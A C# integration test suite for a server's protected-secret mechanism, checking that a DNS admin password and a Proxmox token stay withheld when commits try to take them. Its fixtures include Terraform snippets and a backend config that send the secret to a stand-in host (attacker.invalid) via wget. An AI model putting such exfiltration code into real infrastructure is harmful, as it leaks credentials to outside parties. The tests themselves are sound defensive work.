using System.Formats.Tar;
using System.IO.Compression;
using System.Net;
using System.Net.Http.Json;
using System.Text.Json.Nodes;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Octopushy.Agent.V1;
using Octopushy.Server.Data;
using Octopushy.Server.Orchestration;
using Octopushy.Server.Store;
using Octopushy.Tests.Definitions;

namespace Octopushy.Tests.Server;

/// <summary>
/// The attacks a commit can make on a protected secret, each through the real path to release:
/// the engine, the assignment, and the store. What matters is that the value never reaches an
/// agent, not that some validation complains.
/// </summary>
[Collection(PostgresCollection.Name)]
public class ProtectedSecretTests(PostgresFixture postgres)
{
    private const string Key = "dns/admin";
    private const string Password = "a-shared-dns-admin-password";
    private const string Secondary = ClusterDefinitionTests.Secondary;

    private static async Task<(ServerHarness Server, FakeAgent Agent, HttpClient Client)> StartAsync(PostgresFixture postgres, TestRepository repository, bool protect = true)
    {
        var server = await ServerHarness.StartAsync(postgres, repository);
        await server.SetSecretAsync(Key, Password);
        var agent = await server.ConnectAgentAsync("home");
        var client = await InstallationTrustTests.AuthenticateAsync(server);
        if (protect)
            (await client.PostAsJsonAsync("/api/variables/protection", new { key = Key, @protected = true })).EnsureSuccessStatusCode();
        await server.SyncAndTrustAsync(client);
        return (server, agent, client);
    }

    private static async Task<JsonObject> ClusterAsync(HttpClient client)
    {
        var inventory = (await client.GetFromJsonAsync<JsonObject>("/api/inventory"))!;
        return inventory["labs"]![0]!["clusters"]![0]!.AsObject();
    }

    /// <summary>Trust cluster as the first deployment uses it: code first, certificates later.</summary>
    private static async Task TrustCodeAsync(HttpClient client)
    {
        var cluster = await ClusterAsync(client);
        (await client.PostAsJsonAsync($"/api/clusters/{cluster["id"]}/trust", new
        {
            endpoints = cluster["trust"]!["endpoints"],
            codeDigest = cluster["trust"]!["codeDigest"]!.GetValue<string>(),
        })).EnsureSuccessStatusCode();
    }

    /// <summary>Everything an agent is handed for a while, answering what keeps the run moving.</summary>
    private static async Task<List<Assignment>> DriveAsync(ServerHarness server, FakeAgent agent, int ticks = 6)
    {
        var seen = new List<Assignment>();
        for (var i = 0; i < ticks; i++)
        {
            await server.TickAsync();
            foreach (var assignment in agent.TakeAssignments())
            {
                seen.Add(assignment);
                if (assignment.Action == "observe")
                    await agent.ReportAsync(assignment, Outcome.Succeeded, new JsonObject());
            }
        }

        return seen;
    }

    private static Task<int> ReleasesAsync(ServerHarness server) =>
        server.QueryAsync(db => db.SecretResolutions.CountAsync(r => r.Key == Key));

    private static async Task FinishGuestsAsync(ServerHarness server, FakeAgent agent)
    {
        var verified = 0;
        for (var i = 0; i < 40 && verified < 2; i++)
        {
            await server.TickAsync();
            foreach (var assignment in agent.TakeAssignments())
            {
                switch (assignment.Action)
                {
                    case "observe":
                        await agent.ReportAsync(assignment, Outcome.Succeeded, new JsonObject());
                        break;
                    case "preview":
                        await agent.ReportAsync(assignment, Outcome.Succeeded, FakeAgent.Plan(create: 1), artifacts: FakeAgent.PlanArtifact());
                        break;
                    case "apply":
                        await agent.ReportAsync(assignment, Outcome.Succeeded, new JsonObject { ["outputs"] = new JsonObject(), ["sensitiveOutputs"] = new JsonArray() });
                        break;
                    case "verify-guest":
                        await agent.ReportAsync(assignment, Outcome.Succeeded, new JsonObject { ["present"] = true });
                        verified++;
                        break;
                }
            }
        }

        Assert.Equal(2, verified);
    }

    private static List<string> FilesOf(Assignment assignment)
    {
        using var gzip = new GZipStream(new MemoryStream(assignment.FilesTarGz.ToByteArray()), CompressionMode.Decompress);
        using var tar = new TarReader(gzip);
        var names = new List<string>();
        while (tar.GetNextEntry() is { } entry)
            names.Add(entry.Name);
        return names;
    }

    [Fact]
    public async Task A_guest_of_a_protected_password_waits_for_a_grant_and_then_applies()
    {
        using var repository = ClusterDefinitionTests.Repository();
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;

        var withheld = await DriveAsync(server, agent);
        Assert.DoesNotContain(withheld, a => a.Executor == "opentofu");
        var run = await server.LatestRunAsync(Secondary, Operations.Provision);
        Assert.Equal(RunStatuses.Blocked, run.Status);
        Assert.StartsWith("Waiting for trust", run.Detail);
        Assert.Contains(Key, run.Detail);
        Assert.Equal(0, await ReleasesAsync(server));

        // The order the docs give: trust the code, and the guests can install.
        await TrustCodeAsync(client);
        await server.TickAsync();
        var preview = await agent.NextAsync("preview");
        await agent.ReportAsync(preview, Outcome.Succeeded, FakeAgent.Plan(create: 1), artifacts: FakeAgent.PlanArtifact());
        Assert.DoesNotContain(Password, preview.Secrets.Values);
    }

    [Fact]
    public async Task A_grant_covers_the_code_it_was_given_for_and_a_changed_root_loses_it_whatever_the_policy()
    {
        // The attack: leave the cluster, and put an exfiltrating provisioner in a member's root.
        using var repository = ClusterDefinitionTests.Repository();
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;
        await TrustCodeAsync(client);
        await FinishGuestsAsync(server, agent);
        var released = await ReleasesAsync(server);
        Assert.True(released > 0, "the guests' applies should have received the password");

        repository.Write("modules/opentofu/test-vm/main.tf", """
            resource "terraform_data" "leak" {
              provisioner "local-exec" {
                command = "wget -q -O- https://attacker.invalid/$TF_VAR_admin_password"
              }
            }
            """);
        repository.Write(ClusterDefinitionTests.SecondaryFile,
            ClusterDefinitionTests.Guest("moraband", 420, "10.1.0.42", "policy: { approval: automatic, destructive: automatic }"));
        server.Commit("Change a member's root");
        await server.SyncAsync();

        var withheld = await DriveAsync(server, agent);
        Assert.DoesNotContain(withheld, a => a.Executor == "opentofu" && a.Secrets.Values.Contains(Password));
        Assert.DoesNotContain(withheld, a => a.Action == "apply");
        var run = await server.LatestRunAsync(Secondary, Operations.Provision);
        Assert.Equal(RunStatuses.Blocked, run.Status);
        Assert.Contains("Waiting for trust", run.Detail);
        Assert.Contains("changed since it was granted", run.Detail);
        Assert.Equal(released, await ReleasesAsync(server));
    }

    [Fact]
    public async Task The_same_attack_works_on_nothing_while_the_cluster_waits_for_its_first_trust()
    {
        using var repository = ClusterDefinitionTests.Repository();
        repository.Write("modules/opentofu/test-vm/main.tf", """resource "terraform_data" "leak" {}""");
        repository.Write(ClusterDefinitionTests.SecondaryFile,
            ClusterDefinitionTests.Guest("moraband", 420, "10.1.0.42", "policy: { approval: automatic }"));
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;
        var seen = await DriveAsync(server, agent);
        Assert.DoesNotContain(seen, a => a.Secrets.Values.Contains(Password));
        Assert.Equal(0, await ReleasesAsync(server));
    }

    [Fact]
    public async Task Deleting_the_cluster_does_not_lift_the_protection_of_its_password()
    {
        // The attack: in one commit, delete the cluster, bind its password to a backend's
        // environment, and change a guest's root to send that away while planning.
        using var repository = ClusterDefinitionTests.Repository();
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;
        await TrustCodeAsync(client);
        await FinishGuestsAsync(server, agent);
        var released = await ReleasesAsync(server);

        repository.Delete("labs/home/clusters/technitium");
        repository.Write("octopushy.yaml", """
            schemaVersion: 1
            stateBackends:
              postgres:
                type: pg
                config: { schema_name: octopushy_state }
                workspace: "{stack}"
                env:
                  PG_CONN_STR: { store: opentofu/pg }
                  LEAK: { store: dns/admin }
            """);
        repository.Write("modules/opentofu/test-vm/main.tf", """data "external" "leak" { program = ["sh", "-c", "wget https://attacker.invalid/$LEAK"] }""");
        server.Commit("Take the password");
        await server.SyncAsync();

        // Revision-local validation has nothing to go on here: the cluster is gone from it.
        var revision = await server.QueryAsync(db => db.Revisions.OrderByDescending(r => r.Sequence).FirstAsync());
        Assert.True(revision.RepositoryValid);

        var withheld = await DriveAsync(server, agent);
        Assert.DoesNotContain(withheld, a => a.Secrets.Values.Contains(Password));
        Assert.DoesNotContain(withheld, a => a.Action == "preview");
        var run = await server.LatestRunAsync(Secondary);
        Assert.Equal(RunStatuses.Blocked, run.Status);
        Assert.StartsWith("Waiting for trust", run.Detail);
        Assert.Equal(released, await ReleasesAsync(server));
    }

    [Fact]
    public async Task The_store_itself_refuses_a_release_nothing_else_stopped()
    {
        using var repository = ClusterDefinitionTests.Repository();
        var (server, _, client) = await StartAsync(postgres, repository);
        await using var __ = server;
        using var ___ = client;
        var guest = await server.QueryAsync(db => db.Resources.Where(r => r.Address == Secondary).Select(r => r.Id).SingleAsync());
        var version = await server.QueryAsync(db => db.StoreEntries.Where(e => e.Key == Key).Select(e => e.CurrentVersion).SingleAsync());

        async Task<List<string>> ReleaseAsync(string? digest)
        {
            await using var scope = server.Services.CreateAsyncScope();
            var store = scope.ServiceProvider.GetRequiredService<VariableStore>();
            var names = new Dictionary<string, Octopushy.Definitions.StoreReference> { ["x"] = new(Key, version) };
            var (values, missing) = await store.ResolveForAttemptAsync(names, new HashSet<string>(["x"]), Guid.NewGuid(), Guid.NewGuid(),
                new SecretRelease(guest, digest, Secondary), CancellationToken.None);
            Assert.Equal(missing.Count == 0, values.ContainsKey("x"));
            return missing;
        }

        Assert.Contains("no grant", Assert.Single(await ReleaseAsync("abc")));
        (await client.PostAsJsonAsync("/api/variables/grants", new { key = Key, resourceId = guest, codeDigest = "abc" })).EnsureSuccessStatusCode();
        Assert.Contains("changed since", Assert.Single(await ReleaseAsync("def")));
    }

    [Fact]
    public async Task A_protected_proxmox_token_goes_through_the_same_check()
    {
        using var repository = ClusterDefinitionTests.Repository();
        var (server, agent, client) = await StartAsync(postgres, repository, protect: false);
        await using var _ = server;
        using var __ = client;
        (await client.PostAsJsonAsync("/api/variables/protection", new { key = "proxmox/korriban/read-only-token", @protected = true })).EnsureSuccessStatusCode();
        server.Commit("Sync again");
        await server.TickAsync();

        var seen = await DriveAsync(server, agent);
        Assert.DoesNotContain(seen, a => a.Action is "preview" or "apply");
        Assert.Contains("proxmox/korriban/read-only-token", (await server.LatestRunAsync(Secondary, Operations.Provision)).Detail);
    }

    private const string AttackerBackend = """
        schemaVersion: 1
        stateBackends:
          postgres:
            type: http
            config: { address: "https://attacker.invalid/state" }
            env:
              TF_HTTP_PASSWORD: { store: dns/admin }
        """;

    [Fact]
    public async Task An_unchanged_root_cannot_take_the_password_to_a_new_state_backend()
    {
        // The attack: not one line of code changes, so resource and digest of code still match.
        // HTTP backend authentication would send the password during init, before any approval.
        using var repository = ClusterDefinitionTests.Repository();
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;
        await TrustCodeAsync(client);
        await FinishGuestsAsync(server, agent);
        var released = await ReleasesAsync(server);

        repository.Delete("labs/home/clusters/technitium");
        repository.Write("octopushy.yaml", AttackerBackend);
        server.Commit("Keep the state somewhere else");
        await server.SyncAsync();
        Assert.True((await server.QueryAsync(db => db.Revisions.OrderByDescending(r => r.Sequence).FirstAsync())).RepositoryValid);

        var withheld = await DriveAsync(server, agent);
        Assert.DoesNotContain(withheld, a => a.Secrets.Values.Contains(Password));
        Assert.DoesNotContain(withheld, a => a.Action == "preview");
        var run = await server.LatestRunAsync(Secondary);
        Assert.Equal(RunStatuses.Blocked, run.Status);
        Assert.StartsWith("Waiting for trust", run.Detail);
        Assert.Equal(released, await ReleasesAsync(server));
    }

    [Fact]
    public async Task A_protected_secret_never_goes_to_a_backend_even_for_a_grant_of_exactly_that()
    {
        using var repository = ClusterDefinitionTests.Repository();
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;
        await TrustCodeAsync(client);
        await FinishGuestsAsync(server, agent);

        repository.Delete("labs/home/clusters/technitium");
        repository.Write("octopushy.yaml", AttackerBackend);
        server.Commit("Keep the state somewhere else");
        await server.SyncAsync();
        await DriveAsync(server, agent);

        // An operator clicks through it. The value of a backend's environment reaches init, which
        // is before any plan, so it is not something a review of the run can come in time for.
        var run = await server.LatestRunAsync(Secondary);
        var digest = RunContext.Parse(run.Context).CodeDigest;
        (await client.PostAsJsonAsync("/api/variables/grants", new { key = Key, resourceId = run.ResourceId, codeDigest = digest })).EnsureSuccessStatusCode();

        var released = await ReleasesAsync(server);
        var withheld = await DriveAsync(server, agent);
        Assert.DoesNotContain(withheld, a => a.Secrets.Values.Contains(Password));
        Assert.Equal(released, await ReleasesAsync(server));
        Assert.Contains("state backend", (await server.LatestRunAsync(Secondary)).Detail);
    }

    [Fact]
    public async Task Trust_cluster_shows_how_each_member_would_run()
    {
        using var repository = ClusterDefinitionTests.Repository();
        var (server, _, client) = await StartAsync(postgres, repository);
        await using var __ = server;
        using var ___ = client;
        var member = (await ClusterAsync(client))["members"]!.AsArray().Single(m => m!["guest"]!.GetValue<string>() == Secondary)!;
        var execution = member["execution"]!;
        Assert.Equal("pg", execution["backend"]!["type"]!.GetValue<string>());
        Assert.Equal("dns/admin", execution["secrets"]!["admin_password"]!.GetValue<string>());
        Assert.Contains("home", execution["agentLabels"]!.AsArray().Select(l => l!.GetValue<string>()));
    }

    [Fact]
    public async Task A_run_with_a_protected_secret_receives_only_the_reviewed_files()
    {
        using var repository = ClusterDefinitionTests.Repository();
        repository.Write("modules/opentofu/outside/main.tf", "# not reviewed\n");
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;
        await TrustCodeAsync(client);
        await server.TickAsync();

        var files = FilesOf(await agent.NextAsync("preview"));
        Assert.Contains("modules/opentofu/test-vm/.terraform.lock.hcl", files);
        Assert.Contains("recipes/test-ct/recipe.yaml", files);
        Assert.All(files, f => Assert.True(f.StartsWith("modules/opentofu/test-vm/", StringComparison.Ordinal) || f.StartsWith("recipes/test-ct/", StringComparison.Ordinal), f));
    }

    [Fact]
    public async Task A_run_without_a_protected_secret_still_receives_the_repository()
    {
        using var repository = ClusterDefinitionTests.Repository();
        repository.Write("modules/opentofu/outside/main.tf", "# not reviewed\n");
        var (server, agent, client) = await StartAsync(postgres, repository, protect: false);
        await using var _ = server;
        using var __ = client;
        await server.TickAsync();
        Assert.Contains("modules/opentofu/outside/main.tf", FilesOf(await agent.NextAsync("preview")));
    }

    [Fact]
    public async Task A_run_with_a_protected_secret_is_told_to_load_nothing_that_was_not_reviewed()
    {
        using var repository = ClusterDefinitionTests.Repository();
        repository.Write("modules/opentofu/outside/main.tf", "# a module the recipe lists\n");
        repository.Write("recipes/test-ct/recipe.yaml", """
            schemaVersion: 1
            operation: provision
            executor: opentofu
            root: ../../modules/opentofu/test-vm
            modules: [../../modules/opentofu/outside]
            verify: proxmox
            guestType: container
            """);
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;
        await TrustCodeAsync(client);
        await server.TickAsync();

        var input = JsonNode.Parse((await agent.NextAsync("preview")).InputJson)!;
        Assert.Equal(["modules/opentofu/outside"], input["reviewed"]!["modules"]!.AsArray().Select(m => m!.GetValue<string>()));
    }

    [Fact]
    public async Task A_run_without_a_protected_secret_is_not_held_to_the_reviewed_folders()
    {
        using var repository = ClusterDefinitionTests.Repository();
        var (server, agent, client) = await StartAsync(postgres, repository, protect: false);
        await using var _ = server;
        using var __ = client;
        await server.TickAsync();
        Assert.Null(JsonNode.Parse((await agent.NextAsync("preview")).InputJson)!["reviewed"]);
    }

    [Fact]
    public async Task A_module_hidden_behind_a_comment_gets_no_run_and_no_password()
    {
        // The attack: trust a harmless root, then have it call code the digest does not cover.
        using var repository = ClusterDefinitionTests.Repository();
        var (server, agent, client) = await StartAsync(postgres, repository);
        await using var _ = server;
        using var __ = client;
        await TrustCodeAsync(client);
        await FinishGuestsAsync(server, agent);

        repository.Write("modules/opentofu/cluster/main.tf", """/* comment */ module "outside" { source = "../outside" }""");
        repository.Write("modules/opentofu/outside/main.tf", """data "external" "leak" { program = ["sh", "-c", "wget https://attacker.invalid/$TECHNITIUM_PASSWORD"] }""");
        server.Commit("Reach outside the root");
        await server.SyncAsync();
        var seen = await DriveAsync(server, agent);
        Assert.DoesNotContain(seen, a => a.Executor == "technitium" || a.InputJson.Contains("home.clusters.technitium"));
        Assert.False((await ClusterAsync(client))["valid"]!.GetValue<bool>());
    }

    [Fact]
    public async Task Taking_protection_off_is_an_operators_act_and_a_definition_cannot_set_it()
    {
        using var repository = ClusterDefinitionTests.Repository();
        var (server, _, client) = await StartAsync(postgres, repository);
        await using var __ = server;
        using var ___ = client;
        var entry = await server.QueryAsync(db => db.StoreEntries.SingleAsync(e => e.Key == Key));
        Assert.True(entry.Protected);
        Assert.Equal("ops", entry.ProtectedBy);
        var variables = (await client.GetFromJsonAsync<JsonObject>("/api/variables"))!;
        Assert.True(variables["entries"]!.AsArray().Single(e => e!["key"]!.GetValue<string>() == Key)!["protected"]!.GetValue<bool>());

        // Creating one protected needs no second call, so it is never released in between.
        (await client.PutAsJsonAsync("/api/variables", new { key = "dns/new", value = "a-new-value", visibility = "secret", @protected = true })).EnsureSuccessStatusCode();
        Assert.True(await server.QueryAsync(db => db.StoreEntries.Where(e => e.Key == "dns/new").Select(e => e.Protected).SingleAsync()));

        Assert.Equal(HttpStatusCode.Conflict,
            (await client.PostAsJsonAsync("/api/variables/protection", new { key = "dns/none", @protected = true })).StatusCode);
    }
}
